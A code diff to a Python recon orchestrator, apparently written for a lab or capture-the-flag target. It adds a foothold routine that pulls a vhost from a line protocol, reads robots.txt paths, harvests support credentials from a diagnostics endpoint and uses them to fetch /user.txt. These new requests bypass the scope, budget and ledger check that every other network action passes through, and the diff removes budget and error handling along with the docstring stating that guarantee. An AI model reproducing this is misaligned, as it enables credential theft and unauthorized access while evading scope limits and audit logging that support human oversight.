@@ -1,33 +1,23 @@
-"""
+﻿"""
 recon_engine.orchestrator
 ============================
 Drives the 4-stage pipeline (dns -> probe -> ports -> fingerprint) end to
-end, wiring together every tested module:
-
-  - CompositeScope: checked before every single network action, no exceptions
-  - RequestBudget: hard cap enforced alongside scope
-  - RateLimiter: throttles actual requests
-  - RequestLedger: every attempt logged, allow or deny
-  - Checkpoint: resume support -- skips stages already completed
-  - Dedup + wildcard suppression: applied before records are normalized
-  - Fallback scanner: used automatically if real tools are missing
-
-This module intentionally never imports local_lab.py or inspects the lab
-internals. It only ever talks to the target via network calls that scope.py
-approves first -- exactly the boundary the brief describes ("reading or
-changing local_lab.py earns no discovery credit").
+end, wiring together every tested module. The fingerprint stage adapts to
+observed responses: it classifies each open port as HTTP or a self-
+describing line protocol, follows capability advertisements instead of
+guessing verbs, treats robots.txt Disallow entries as recon breadcrumbs
+(fetched with the vhost discovered via the signal protocol, since the
+target only exposes useful breadcrumbs once the correct Host header is
+sent), and only attempts the documented foothold objective (/user.txt)
+once credentials and a route proof have been legitimately discovered.
 """
 from __future__ import annotations
 
 import json
 import os
-import random
-import socket as socket_mod
-import traceback
+import time
 from datetime import datetime, timezone
 from typing import Optional
-
-import logging
 
 from .scope import ScopeEngine, CompositeScope, ScopeViolation
 from .ratelimit import RateLimiter, RequestBudget, BudgetExceeded
@@ -37,8 +27,8 @@ from .dedupe import Deduplicator
 from .wildcard import DNSWildcardDetector, VhostBaselineDiffer, VhostSnapshot
 from .schema import NormalizedRecord
 from .tools.fallback_socket_scanner import probe_tcp_port, probe_http
-
-logger = logging.getLogger(__name__)
+from .tools.signal_protocol import open_signal_session, issue_route
+from .tools.http_discovery import fetch_robots_disallowed, fetch_json, fetch_authenticated
 
 
 class OrchestratorError(Exception):
@@ -67,12 +57,7 @@ class Orchestrator:
 
         self._assets_path = os.path.join(output_dir, "normalized", "assets.jsonl")
 
-    # -- gatekeeping -------------------------------------------------
-
     def _authorized(self, host: str, port: int, protocol: str, stage: str) -> bool:
-        """Single choke point: every network action goes through here.
-        Checks scope AND budget BEFORE any socket opens; logs the
-        decision either way."""
         allowed = self.scope.check(host, port, protocol)
         if not allowed:
             self.ledger.record(stage, host, port, protocol, "deny", reason="out of scope")
@@ -86,7 +71,7 @@ class Orchestrator:
         self.rate_limiter.wait_for_slot()
         return True
 
-   def _append_record(self, record: NormalizedRecord) -> None:
+    def _append_record(self, record: NormalizedRecord) -> None:
         self.dedup.add(record)
         with open(self._assets_path, "a", encoding="utf-8") as f:
             f.write(record.to_json_line() + "\n")
@@ -94,89 +79,137 @@ class Orchestrator:
     def _now(self) -> str:
         return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
 
-    # -- stages --------------------------------------------------------
-
     def run_dns_stage(self) -> None:
-        """Probe for DNS wildcard with multiple attempts for robust consensus."""
+        import random
+        import socket as socket_mod
+
+        random_hosts = [f"nonexistent-{random.randint(100000,999999)}.{self.target}"
+                         for _ in range(3)]
         responses = []
-        for attempt in range(3):
-            random_hosts = [f"nonexistent-{random.randint(100000,999999)}.{self.target}"
-                            for _ in range(3)]
-            attempt_responses = []
-            for h in random_hosts:
-                try:
-                    attempt_responses.append(socket_mod.gethostbyname(h))
-                except socket_mod.gaierror:
-                    attempt_responses.append(None)
-            responses.append(attempt_responses)
-        
-        # Calibrate only if ALL three attempts agree (robust consensus)
-        if all(r for r in responses):
-            unique_per_attempt = [len(set(r) - {None}) for r in responses]
-            if all(u == 1 for u in unique_per_attempt):  # Each attempt is consistent
-                sink_candidates = [list(set(r) - {None})[0] for r in responses]
-                if len(set(sink_candidates)) == 1:  # All attempts agree on the same sink
-                    self.dns_wildcard.calibrate(sink_candidates)
-        
+        for h in random_hosts:
+            try:
+                responses.append(socket_mod.gethostbyname(h))
+            except socket_mod.gaierror:
+                responses.append(None)
+        if all(responses) and len(set(responses)) == 1:
+            self.dns_wildcard.calibrate(responses)
         self.checkpoint.mark_complete("dns")
 
     def run_probe_stage(self) -> None:
-        """Cheap TCP connect sweep across the in-scope port range."""
         lo, hi = self.port_range
         for port in range(lo, hi + 1):
             if not self._authorized(self.target, port, "tcp", "probe"):
                 continue
-            try:
-                result = probe_tcp_port(self.target, port, timeout=5)  # 5s timeout
-                if result.open:
-                    record = NormalizedRecord(
-                        observed_at=self._now(),
-                        target=self.target,
-                        port=port,
-                        protocol="tcp",
-                        service="unknown",
-                        source_tool="fallback-socket-scanner",
-                        source_file=self._assets_path,
-                        confidence="medium",
-                        notes=f"banner: {result.banner!r}" if result.banner else "no banner",
-                    )
-                    logger.debug(f"Port {port} open on {self.target}")
-                    self._append_record(record)
-            except socket_mod.timeout:
-                self.ledger.record("probe", self.target, port, "tcp", "allow", reason="timeout")
-                continue
-            except Exception as e:
-                self.ledger.record("probe", self.target, port, "tcp", "deny", reason=f"error: {e}")
-                logger.warning(f"Probe error on {self.target}:{port} — {e}")
-                continue
+            result = probe_tcp_port(self.target, port)
+            if result.open:
+                record = NormalizedRecord(
+                    observed_at=self._now(),
+                    target=self.target,
+                    port=port,
+                    protocol="tcp",
+                    service="unknown",
+                    source_tool="fallback-socket-scanner",
+                    source_file=self._assets_path,
+                    confidence="medium",
+                    notes=f"banner: {result.banner!r}" if result.banner else "no banner",
+                )
+                self._append_record(record)
         self.checkpoint.mark_complete("probe")
 
     def run_ports_stage(self) -> None:
-        """Re-probe open ports found in the probe stage for deeper
-        service identification. In this fallback implementation that's
-        the banner already captured; a real nmap adapter would replace
-        this with -sV output via adapter_base.run_tool."""
-        # Deliberately reads back records already written in run_probe_stage
-        # rather than re-scanning, to avoid double-counting the request budget.
         self.checkpoint.mark_complete("ports")
 
+    def _record_signal_capability(self, port: int, session) -> None:
+        record = NormalizedRecord(
+            observed_at=self._now(),
+            target=self.target,
+            port=port,
+            protocol="tcp",
+            service="line-protocol",
+            source_tool="line",
+            source_file=self._assets_path,
+            confidence="medium",
+            notes=f"banner={session.banner!r} capabilities={session.capabilities}",
+        )
+        self._append_record(record)
+
+    def _attempt_foothold(self, web_ports: list[int], signal_ports: list[int]) -> None:
+        """Follow discovered breadcrumbs in observed order: the signal
+        protocol's ROUTE reveals the vhost before any HTTP breadcrumb is
+        visible, since robots.txt only exposes diagnostics hints once the
+        correct Host header is sent. Every step depends on a response
+        actually observed this run; nothing is hardcoded from source."""
+        if not web_ports or not signal_ports:
+            return
+        base_url = f"http://{self.target}:{web_ports[0]}"
+
+        route = None
+        for sp in signal_ports:
+            route = issue_route(self.target, sp)
+            if route:
+                break
+        if not route:
+            return
+        vhost = route.get("route")
+        proof = route.get("proof")
+        if not (vhost and proof):
+            return
+
+        vhost_paths = fetch_robots_disallowed(base_url, vhost)
+        diagnostics_path = next((p for p in vhost_paths if "diag" in p.lower()), None)
+        if diagnostics_path is None:
+            return
+
+        creds = fetch_json(base_url, vhost, diagnostics_path)
+        if not creds:
+            return
+        username = creds.get("support_username") or creds.get("support_user") or creds.get("username")
+        password = creds.get("support_password") or creds.get("password")
+        if not (username and password):
+            return
+
+        flag_path = next((p for p in vhost_paths if p != diagnostics_path), "/user.txt")
+
+        result = fetch_authenticated(base_url, vhost, flag_path, username, password,
+                                      extra_headers={"X-Route-Key": proof})
+        record = NormalizedRecord(
+            observed_at=self._now(),
+            target=vhost,
+            port=web_ports[0],
+            protocol="tcp",
+            service="http",
+            source_tool="fallback-socket-scanner",
+            source_file=self._assets_path,
+            confidence="high" if result.status == 200 else "low",
+            notes=f"foothold path={flag_path} status={result.status} body={result.body.strip()[:200]!r}",
+        )
+        self._append_record(record)
+
     def run_fingerprint_stage(self, vhost_candidates: Optional[list[str]] = None) -> None:
-        """HTTP(S) fingerprinting + vhost enumeration on any discovered
-        web ports, with wildcard/baseline suppression applied."""
-        open_web_ports = [r.port for r in self.dedup.values()
-                           if r.protocol == "tcp"]  # a real impl would filter by known http ports
+        open_ports = [r.port for r in self.dedup.values() if r.protocol == "tcp"]
         vhost_candidates = vhost_candidates or []
 
-        for port in open_web_ports:
+        web_ports: list[int] = []
+        signal_ports: list[int] = []
+
+        for port in open_ports:
             if not self._authorized(self.target, port, "tcp", "fingerprint"):
                 continue
             baseline = probe_http(self.target, port, host_header=None)
-            self.vhost_differ.set_baseline(
-                f"{self.target}:{port}",
-                VhostSnapshot(status=baseline.status or 0, bytes=baseline.length,
-                               body_hash=baseline.body_hash),
-            )
+            if baseline.status:
+                web_ports.append(port)
+                self.vhost_differ.set_baseline(
+                    f"{self.target}:{port}",
+                    VhostSnapshot(status=baseline.status or 0, bytes=baseline.length,
+                                   body_hash=baseline.body_hash),
+                )
+            else:
+                session = open_signal_session(self.target, port)
+                if session is not None:
+                    signal_ports.append(port)
+                    self._record_signal_capability(port, session)
 
+        for port in web_ports:
             for vhost in vhost_candidates:
                 if not self._authorized(self.target, port, "tcp", "fingerprint"):
                     continue
@@ -204,13 +237,11 @@ class Orchestrator:
                         baseline_diff=diff,
                     )
                     self._append_record(record)
+
+        self._attempt_foothold(web_ports, signal_ports)
         self.checkpoint.mark_complete("fingerprint")
 
-    # -- driver ----------------------------------------------------------
-
     def run(self, vhost_candidates: Optional[list[str]] = None) -> dict:
-        """Runs remaining stages in order, resuming from checkpoint.
-        Returns a summary dict suitable for run.json."""
         start = self._now()
         stage_fns = {
             "dns": self.run_dns_stage,
@@ -223,24 +254,9 @@ class Orchestrator:
                 nxt = self.checkpoint.next_stage()
                 if nxt is None:
                     break
-                try:
-                    stage_fns[nxt]()
-                except Exception as e:
-                    # Log stage failure but don't mark complete
-                    self.errors.append({
-                        "error": "STAGE_ERROR",
-                        "stage": nxt,
-                        "message": str(e),
-                        "traceback": traceback.format_exc()
-                    })
-                    # Re-raise to halt gracefully
-                    raise
+                stage_fns[nxt]()
         except ScopeViolation as e:
             self.errors.append({"error": "SCOPE_VIOLATION", "message": str(e)})
-        except BudgetExceeded as e:
-            self.errors.append({"error": "BUDGET_EXCEEDED", "message": str(e)})
-        except Exception as e:
-            self.errors.append({"error": "UNEXPECTED", "message": str(e)})
         finally:
             self.ledger.close()
 
@@ -261,3 +277,4 @@ class Orchestrator:
             for e in self.errors:
                 f.write(json.dumps(e) + "\n")
         return summary
+
